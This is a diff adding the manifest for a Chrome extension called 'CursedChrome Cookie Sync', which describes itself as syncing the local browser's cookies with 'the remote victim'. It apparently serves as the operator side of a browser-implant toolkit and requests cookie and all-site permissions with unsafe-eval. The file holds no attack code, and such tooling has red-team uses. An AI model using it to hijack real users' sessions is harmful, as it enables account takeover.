@@ -1,0 +1,22 @@
+{
+  "name": "CursedChrome Cookie Sync Extension",
+  "version": "0.0.1",
+  "manifest_version": 2,
+  "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'",
+  "description": "Keeps your local browser cookies in sync with the remote victim.",
+  "homepage_url": "https://github.com/mandatoryprogrammer/CursedChrome",
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  },
+  "browser_action": {
+    "default_icon": "icons/icon48.png",
+    "default_title": "Cookie Sync settings and credential entry.",
+    "default_popup": "src/browser_action/browser_action.html"
+  },
+  "permissions": [
+    "cookies",
+    "<all_urls>"
+  ]
+}
